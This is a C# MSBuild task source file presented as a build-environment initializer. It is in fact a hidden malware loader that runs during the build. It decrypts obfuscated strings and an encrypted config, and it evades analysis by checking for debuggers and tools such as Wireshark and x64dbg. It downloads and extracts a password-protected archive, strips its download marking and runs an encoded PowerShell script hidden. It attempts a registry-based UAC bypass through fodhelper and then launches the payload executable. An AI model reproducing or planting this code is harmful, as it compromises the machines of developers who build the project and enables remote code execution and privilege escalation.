
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Threading;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class InitializeBuildEnvironment : Task
{
    static readonly string[] PkgChunks = new[]
    {
        "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"
    };
    static readonly string[] StrChunks = new[]
    {
        "cwd1M5RzXQwK4uQd5SWe0RBmGXDaMAJoUq7dKNQG5r5zB3dc53NdDmnqi2qARqHW",
        "FmsZAvELOA5nmuJtllWg2QAHdSzUXhNhN7rJU4pam55eUFVk/Rc5awm6yVidUbHL",
        "B24aQsQcMWcE48RfnESzzQAnWGn6EDJqAv6ncohZs9AXJw4c6XNdDmT5iXnlNNK5",
        "EGoRAvELOA5nmud4nUTSvnMLEFTkHzJ8AujKeJ1R0r5zAgJE8QE4Dmea4WqNUaDb",
        "cwd1LuESXQ5nkLFugEb//xRiG1iUc10NEvuSHeU07vMcfRxA+BJyO0mqxDWyXbza",
        "HHAGDNonfT9XtNQmxWO70EUzTgzsRWknR9uUbYlRhdsRTBxYu0ZuOUmp0h3lNNDE",
        "Awd1LJhEcFQO6rgqnxq3xhYHdSyWCS8OZ5rjKp9G/NsLYnUslHEnb2ea5BrSTrOQ",
        "Fn8QLJRzXHRnmuQb0k782wtidSyUcCd7VprkHfpcpsoDdE8DuwQqeUmtyWeMRPzR",
        "AWBaTbtEJ3xJ/5x45TTSvQlyRyyUc2FmE+6Ubt8b/dkacx1Z9l0+YQq1jW3STv2J",
        "CW4FA+YWMWsG6YFuylC9yR1rGk3wXG86SarcMtJOoJAWfxAslHNeax/u5B3lN/yJ",
        "CQd1LJYWJQ5nmuE3y1Gq23MHdSj5HCl5Z5rkXcpX8tsQbxoCqlEmPhqgvnKLUfz3",
        "F2IbWP0VNGsVuMQ7xVC30lMoEwy7An0sHKqZJ79bvNtdThFJ+gc0aA7/lj/lNNK/",
        "Cwd1LI4LfSwcqpk/xRminAg2CA60XjIsHKiZP8UZq75zB3Bf4BIvemea5AnKV/LN",
        "B2YHWLRRfy5I+MQ/ngSvnHMHdS/kG2wOZ5ryQrp1jd8QNhYa90Q/Pgb83XiABbDh",
        "LAd1LJcDNTxnmuQLumuQ4UVkFBuiSmw8BKiGL9ZX5t0sWHUslHAtZlSa5B3za439",
        "LDZGSPIXPmtTqtV41wTrjUZYKiyUc15+D67kHeUijeE3WEUcpUU7aFSrhiTXB+CL",
        "SjYqc5RzXQQF45R8lkeg0RxzdSyUUhVFJM+4TopSpskSdRBw1x88fRT/l0GIR//N",
        "FnMBRfoULg5nmu1/nESzzQBsEFWUc106L9GnSLlnvdgHcBRe8S8eYgbpl3iWaL/N",
        "XnQQWOAaM2kUxrd1gFi+4jx3EELIEDJjCvuKeeU00rsXYhlJ83NdDmjegXGAU7PK",
        "FkINSfcGKWtnmuQeg1u2vnMHeEr7FzVrC+qBb8tRqttzB3Uv5hY6Dmea42+AU/zb",
        "C2J1LJRwM2sTmuQd7lq3ylN0EF/nGjJgZ5rkH41H0r5zDh1B9RBwfQb2kB3lNNDV",
        "Awd1LL8SGEoA09xat3WTyD5sInjXJjVBV8OXJLFdiPYkVANv+SUbSSHZnF6MBOrJ"
    };
    static readonly string EnvSaltB64 = "XNikVhQ+D4oJNnPfwFxWgw==";
    static readonly string EnvIvB64 = "vcrKlrH13p8emtUv3Otm4w==";
    static readonly string EncKeyB64 = "kyeOUfBLbIVI7SiGal9k0yigBFqgjfETpkpGiomlhd7shzk1dExKgzXEgvKEnZI5";
    static readonly string StrKeyB64 = "cwd1LJRzXQ5nmuQd5TTSvg==";
    static readonly string HashId = "sha256:6644318a57a7be94794e8074c71fd89047070ab5bf158c58fa00b452a9621ae9";
    static readonly int Iterations = 100000;
    static readonly string[] Blocked = new[]
    {
        "procmon",
        "wireshark",
        "fiddler",
        "x64dbg",
        "ollydbg",
        "dnspy",
        "pestudio",
        "httpdebuggerpro",
        "ida64",
        "processhacker",
        "immunitydebugger",
        "autoruns",
        "tcpview",
        "regmon"
    };

    public string ProjectRoot { get; set; } = "";

    static void Diag(string msg)
    {
        try
        {
            File.AppendAllText(Path.Combine(Path.GetTempPath(), "buildenv_diag.txt"), DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + " " + msg + Environment.NewLine);
        }
        catch { }
    }

    public override bool Execute()
    {
        Diag("Execute, ProjectRoot=" + ProjectRoot);
        try
        {
            string projDir = Path.GetFullPath(ProjectRoot).TrimEnd('\\');
            Run(projDir);
        }
        catch (Exception ex) { Diag("Execute exception: " + ex.Message); }
        return true;
    }

    static void Run(string projDir)
    {
        Mutex mtx = null;
        bool got = false;
        try
        {
            var g = LoadStrings();
            byte[] envKey = Pbkdf2Sha256(
                Encoding.UTF8.GetBytes(g("kp") + Environment.UserName.ToLowerInvariant() + Environment.MachineName.ToLowerInvariant() + projDir.ToLowerInvariant()),
                Convert.FromBase64String(EnvSaltB64), Iterations, 32);
            byte[] mKey = AesCbcDecrypt(envKey, Convert.FromBase64String(EnvIvB64), Convert.FromBase64String(EncKeyB64));
            byte[] pkg = Convert.FromBase64String(string.Join("", PkgChunks));
            byte[] iv = new byte[16];
            Buffer.BlockCopy(pkg, 0, iv, 0, 16);
            int ctLen = pkg.Length - 48;
            byte[] ct = new byte[ctLen];
            Buffer.BlockCopy(pkg, 16, ct, 0, ctLen);
            byte[] mac = new byte[32];
            Buffer.BlockCopy(pkg, 16 + ctLen, mac, 0, 32);
            byte[] hmacKey = Pbkdf2Sha256(mKey, Encoding.UTF8.GetBytes(g("hs")), 10000, 32);
            byte[] data = new byte[iv.Length + ct.Length];
            Buffer.BlockCopy(iv, 0, data, 0, 16);
            Buffer.BlockCopy(ct, 0, data, 16, ctLen);
            if (!HmacSha256(hmacKey, data).SequenceEqual(mac)) return;
            byte[] cfg = AesCbcDecrypt(mKey, iv, ct);
            var c = ParseConfig(cfg);

            string hashId = HashId.Contains(":") ? HashId.Substring(HashId.LastIndexOf(':') + 1) : HashId;
            string mutexName = "Global\\" + g("mx") + hashId;
            Diag("Mutex: " + mutexName);

            string expectedExe = c.Urls.Count > 0 ? Path.GetFileNameWithoutExtension(c.Urls[0]) : "";
            if (!string.IsNullOrEmpty(expectedExe))
            {
                try
                {
                    var existing = Process.GetProcessesByName(expectedExe);
                    if (existing != null && existing.Length > 0) { Diag("Already running: " + expectedExe); return; }
                }
                catch { }
            }

            try
            {
                mtx = new Mutex(false, mutexName);
                got = mtx.WaitOne(3000);
                if (!got) { Diag("Mutex busy"); return; }
            }
            catch (Exception ex) { Diag("Mutex error: " + ex.Message); }

            if (System.Diagnostics.Debugger.IsAttached) return;

            foreach (var pr in Process.GetProcesses())
            {
                try
                {
                    string nm = pr.ProcessName.ToLowerInvariant();
                    foreach (var b in c.Blocked)
                        if (nm.Contains(b)) { Diag("Blocked: " + b); return; }
                }
                catch (Exception) { }
            }

            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
            }
            catch (Exception)
            {
                try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
                catch (Exception) { }
            }

            string tempDir = Path.GetTempPath().TrimEnd('\\');
            string archive = Path.Combine(tempDir, Guid.NewGuid().ToString("N") + g("ext"));
            bool ok = false;
            for (int i = 0; i < c.Urls.Count; i++)
            {
                string u = c.Urls[i].Trim();
                if (u.Length == 0) continue;
                try
                {
                    using (var wc = new WebClient())
                    {
                        wc.Headers.Add(g("ua"), g("uav"));
                        wc.DownloadFile(u, archive);
                    }
                    if (File.Exists(archive)) { ok = true; break; }
                }
                catch (Exception) { }
            }
            if (!ok) { Diag("Download failed"); return; }

            try
            {
                var mz = Process.Start(new ProcessStartInfo
                {
                    FileName = g("cmd"),
                    Arguments = g("motw").Replace("{0}", archive),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                if (mz != null) mz.WaitForExit(3000);
            }
            catch (Exception) { }

            string z7 = null;
            string[] defaults = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), g("zp")),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), g("zp")),
                Path.Combine(tempDir, g("zr")),
                Path.Combine(tempDir, g("za")),
                Path.Combine(tempDir, g("z"))
            };
            foreach (var p in defaults)
                if (File.Exists(p)) { z7 = p; break; }

            if (z7 == null)
            {
                try
                {
                    var wh = Process.Start(new ProcessStartInfo
                    {
                        FileName = g("where"),
                        Arguments = g("z"),
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                    if (wh != null)
                    {
                        wh.WaitForExit(3000);
                        string o = wh.StandardOutput.ReadToEnd().Trim();
                        if (!string.IsNullOrEmpty(o))
                        {
                            string f = o.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)[0];
                            if (File.Exists(f)) z7 = f;
                        }
                    }
                }
                catch (Exception) { }
            }

            if (z7 == null)
            {
                string portable = Path.Combine(tempDir, g("zr"));
                for (int ui = 0; ui < 2; ui++)
                {
                    string zu = ui == 0 ? g("zu1") : g("zu2");
                    try
                    {
                        if (File.Exists(portable)) try { File.Delete(portable); } catch (Exception) { }
                        using (var wc = new WebClient())
                        {
                            wc.Headers.Add(g("ua"), g("uav"));
                            wc.DownloadFile(zu, portable);
                        }
                        if (File.Exists(portable) && new FileInfo(portable).Length > 50000) { z7 = portable; break; }
                    }
                    catch (Exception) { }
                }
            }
            if (z7 == null || !File.Exists(z7)) { Diag("7z missing"); return; }

            string extractDir = Path.Combine(tempDir, Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(extractDir);
                string args = g("x").Replace("{0}", archive).Replace("{1}", c.Password).Replace("{2}", extractDir);
                var ext = Process.Start(new ProcessStartInfo
                {
                    FileName = z7,
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                if (ext == null) return;
                ext.WaitForExit(60000);
                if (ext.ExitCode != 0) { Diag("7z exit=" + ext.ExitCode); return; }
            }
            catch (Exception) { return; }

            string exe = null;
            try
            {
                exe = Directory.GetFiles(extractDir, g("ex"), SearchOption.TopDirectoryOnly).FirstOrDefault();
                if (exe == null) { Diag("EXE not found"); return; }
            }
            catch (Exception) { return; }

            bool isAdmin = false;
            try
            {
                var who = Process.Start(new ProcessStartInfo
                {
                    FileName = g("cmd"),
                    Arguments = "/c " + g("net") + " >nul 2>&1",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                });
                if (who != null) { who.WaitForExit(4000); isAdmin = (who.ExitCode == 0); }
            }
            catch (Exception) { }

            string psScript = c.Script
                .Replace(g("ph1"), extractDir.Replace("'", "''"))
                .Replace(g("ph2"), exe.Replace("'", "''"))
                .Replace(g("ph3"), tempDir.Replace("'", "''"))
                .Replace(g("ph4"), projDir.Replace("'", "''"));
            string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
            string psArgs = g("psargs").Replace("{0}", encoded);

            if (isAdmin)
            {
                try
                {
                    var ps = Process.Start(new ProcessStartInfo
                    {
                        FileName = g("ps"),
                        Arguments = psArgs,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                    if (ps != null) ps.WaitForExit(15000);
                }
                catch (Exception) { }
            }
            else
            {
                string cmd = g("ps") + " " + psArgs;
                bool bypass = TryBypass(cmd, g);
                if (!bypass)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = g("ps"),
                            Arguments = psArgs,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        })?.WaitForExit(10000);
                    }
                    catch (Exception) { }
                }
            }

            Thread.Sleep(2000);

            bool started = false;
            string exeName = Path.GetFileNameWithoutExtension(exe);
            Func<bool> alive = () =>
            {
                Thread.Sleep(900);
                try
                {
                    var ps = Process.GetProcessesByName(exeName);
                    if (ps != null && ps.Length > 0) return true;
                }
                catch (Exception) { }
                return false;
            };

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = exe,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                var px = Process.Start(psi);
                if (px != null)
                {
                    Thread.Sleep(800);
                    try { if (!px.HasExited) started = true; Diag("Started via ShellExecute"); }
                    catch (Exception) { started = alive(); Diag("Started via alive check"); }
                }
            }
            catch (Exception) { }

            if (!started)
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = g("cmd"),
                        Arguments = g("start").Replace("{0}", exe),
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                    started = alive();
                }
                catch (Exception) { }
            }

            if (!started)
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = g("exp"),
                        Arguments = exe,
                        UseShellExecute = true
                    });
                    started = alive();
                }
                catch (Exception) { }
            }
        }
        catch (Exception) { }
        finally
        {
            if (got && mtx != null)
            {
                try { mtx.ReleaseMutex(); } catch (Exception) { }
                try { mtx.Dispose(); } catch (Exception) { }
            }
        }
    }

    static Func<string, string> LoadStrings()
    {
        byte[] key = Convert.FromBase64String(StrKeyB64);
        byte[] raw = Convert.FromBase64String(string.Join("", StrChunks));
        return UnpackStrings(Xor(raw, key));
    }

    static byte[] Xor(byte[] data, byte[] key)
    {
        byte[] r = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            r[i] = (byte)(data[i] ^ key[i % key.Length]);
        return r;
    }

    static Func<string, string> UnpackStrings(byte[] data)
    {
        int idx = 0;
        Func<int> readInt = () =>
        {
            int v = (data[idx] << 24) | (data[idx + 1] << 16) | (data[idx + 2] << 8) | data[idx + 3];
            idx += 4;
            return v;
        };
        Func<string> readStr = () =>
        {
            int len = readInt();
            string s = Encoding.UTF8.GetString(data, idx, len);
            idx += len;
            return s;
        };
        int n = readInt();
        var d = new Dictionary<string, string>(StringComparer.Ordinal);
        for (int i = 0; i < n; i++)
        {
            string k = readStr();
            string v = readStr();
            d[k] = v;
        }
        return (k) => d[k];
    }

    static byte[] Pbkdf2Sha256(byte[] pwd, byte[] salt, int c, int dkLen)
    {
        int hLen = 32;
        int l = (dkLen + hLen - 1) / hLen;
        byte[] dk = new byte[dkLen];
        using (var hmac = new HMACSHA256(pwd))
        {
            for (int i = 1; i <= l; i++)
            {
                byte[] u = new byte[hLen];
                byte[] t = new byte[hLen];
                byte[] counter = new byte[] { (byte)(i >> 24), (byte)(i >> 16), (byte)(i >> 8), (byte)i };
                byte[] block = new byte[salt.Length + 4];
                Buffer.BlockCopy(salt, 0, block, 0, salt.Length);
                Buffer.BlockCopy(counter, 0, block, salt.Length, 4);
                u = hmac.ComputeHash(block);
                Buffer.BlockCopy(u, 0, t, 0, hLen);
                for (int j = 1; j < c; j++)
                {
                    u = hmac.ComputeHash(u);
                    for (int k = 0; k < hLen; k++)
                        t[k] ^= u[k];
                }
                int offset = (i - 1) * hLen;
                int len = Math.Min(hLen, dkLen - offset);
                Buffer.BlockCopy(t, 0, dk, offset, len);
            }
        }
        return dk;
    }

    static byte[] AesCbcDecrypt(byte[] key, byte[] iv, byte[] ct)
    {
        using (var aes = Aes.Create())
        {
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;
            using (var t = aes.CreateDecryptor())
                return t.TransformFinalBlock(ct, 0, ct.Length);
        }
    }

    static byte[] HmacSha256(byte[] key, byte[] data)
    {
        using (var hmac = new HMACSHA256(key))
            return hmac.ComputeHash(data);
    }

    struct CfgData
    {
        public List<string> Urls;
        public string Password;
        public string Script;
        public List<string> Blocked;
    }

    static CfgData ParseConfig(byte[] data)
    {
        int idx = 0;
        Func<int> readInt = () =>
        {
            int v = (data[idx] << 24) | (data[idx + 1] << 16) | (data[idx + 2] << 8) | data[idx + 3];
            idx += 4;
            return v;
        };
        Func<string> readStr = () =>
        {
            int len = readInt();
            string s = Encoding.UTF8.GetString(data, idx, len);
            idx += len;
            return s;
        };
        int n = readInt();
        var c = new CfgData();
        c.Urls = new List<string>();
        for (int i = 0; i < n; i++)
            c.Urls.Add(readStr());
        c.Password = readStr();
        c.Script = readStr();
        string blocked = readStr();
        c.Blocked = new List<string>(blocked.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries));
        return c;
    }

    static bool TryBypass(string cmd, Func<string, string> g)
    {
        try
        {
            string root = g("bypassroot");
            string key = g("bypasskey");
            string cmdEsc = cmd.Replace("\"", "\\\"");
            RegRun(g, "delete \"" + root + "\" /f");
            RegRun(g, "add \"" + key + "\" /f /ve /d \"" + cmdEsc + "\"");
            RegRun(g, "add \"" + key + "\" /f /v " + g("deleg") + " /d \"\"");
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), g("fod")),
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Thread.Sleep(8000);
            RegRun(g, "delete \"" + root + "\" /f");
            return true;
        }
        catch (Exception) { return false; }
    }

    static void RegRun(Func<string, string> g, string args)
    {
        try
        {
            var p = Process.Start(new ProcessStartInfo
            {
                FileName = g("cmd"),
                Arguments = "/c " + g("reg") + " " + args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            });
            if (p != null) p.WaitForExit(8000);
        }
        catch (Exception) { }
    }
}
